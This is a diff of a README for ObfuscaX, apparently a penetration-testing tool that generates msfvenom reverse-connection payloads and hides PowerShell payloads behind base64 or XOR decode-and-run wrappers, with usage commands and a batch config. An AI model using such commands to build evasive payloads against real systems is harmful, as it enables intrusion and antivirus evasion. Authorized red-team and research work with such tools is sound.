@@ -1,80 +1,82 @@
-# 🔒 ObfuscaX – Payload Obfuscation Framework (BETA)
+# ObfuscaX - Payload Obfuscation Framework
 
-**ObfuscaX** is a tool for creating and testing **obfuscated payloads** 🔐  
-Built for **authorized** penetration testing & security research 🛡️
+ObfuscaX generates Windows payloads with msfvenom and wraps PowerShell payloads in a small obfuscation layer. Use it only on systems you are authorized to test.
 
----
+## Install
 
-## ✨ Features
-- 🌀 Multiple obfuscation modes (static & dynamic)
-- ⚙️ Payload generator (PS1, EXE, etc.)
-- 🔗 Metasploit integration
-- 🧠 In-memory execution (no disk artifacts)
-- 💻 Simple command-line interface
+Python 3.8+. There are no third-party packages.
 
----
-
-## 📦 Installation
-
-**Requirements**  
-- 🐍 Python 3.13+  
-- 💣 Metasploit Framework *(optional)*  
-- 🖥️ Linux / Windows (WSL supported)  
-
-**Setup**
 ```bash
 git clone https://github.com/blueiewu/ObfuscaX.git
 cd ObfuscaX
 python -m venv .venv
 source .venv/bin/activate   # Windows: .venv\Scripts\activate
-pip install -r requirements.txt
 ```
-🚀 Usage
 
-Generate a payload
-```
+msfvenom is optional. Without `--msfvenom`, the tool writes a dummy payload.
+
+## Usage
+
+Generate a PowerShell payload:
+
+```bash
 python src/obfuscator.py --generate --type ps1 \
   --lhost 192.168.1.10 --lport 4444 \
-  --obf dynamic --in-memory
+  --obf dynamic --output payload.ps1
 ```
-Batch mode (from config file)
+
+Generate a raw EXE payload:
+
+```bash
+python src/obfuscator.py --generate --type exe --msfvenom \
+  --lhost 192.168.1.10 --lport 4444 \
+  --output payload.exe
 ```
+
+Run a batch:
+
+```bash
 python src/obfuscator.py --batch config.json
 ```
-Run HTTP delivery server
 
-```
-python src/obfuscator.py --http-server --http-port 8443 --require-token MYTOKEN
+## Obfuscation modes
 
-```
+| Mode | Applies to | What it does |
+|------|------------|--------------|
+| `static` | ps1 | Base64/UTF-16LE wrapper with junk PowerShell lines |
+| `dynamic` | ps1 | XOR + base64 with a small decode-and-run stub |
+| `none` | ps1, exe | No obfuscation |
 
-📜 Example Config (config.json)
+`ps1` defaults to `static`. `exe` defaults to `none`; msfvenom output is saved as-is.
 
-```
+`dynamic` uses a random XOR key unless you pass `--xor-key 1-255`. The key is embedded in the generated stub.
+
+## Batch config
+
+```json
 {
-  "payloads": [
+  "jobs": [
     {
-      "type": "exe",
-      "parameters": {
-        "lhost": "10.0.0.5",
-        "lport": 8080,
-        "obf": "static",
-        "av_bypass": true
-      },
-      "output": "output/payload.exe"
+      "type": "ps1",
+      "lhost": "192.168.1.10",
+      "lport": 4444,
+      "obf": "dynamic",
+      "xor_key": 77,
+      "msfvenom": true,
+      "output": "payload.ps1"
     }
   ]
 }
-
 ```
-⚠️ Notes
 
-   - ✅ Use only with permission
+Each job needs `type` and `output`. Optional keys: `lhost`, `lport`, `obf`, `xor_key`, `msfvenom`. A failed job is logged and the rest still run.
 
-   - 🧪 Perfect for lab testing & training
+## Tests
 
-   - 🐞 Check logs/ for troubleshooting info
+```bash
+python -m unittest discover tests
+```
 
-📄 License
+## License
 
-   - MIT License © 2025 blueiewu
+MIT. See `LICENSE`.
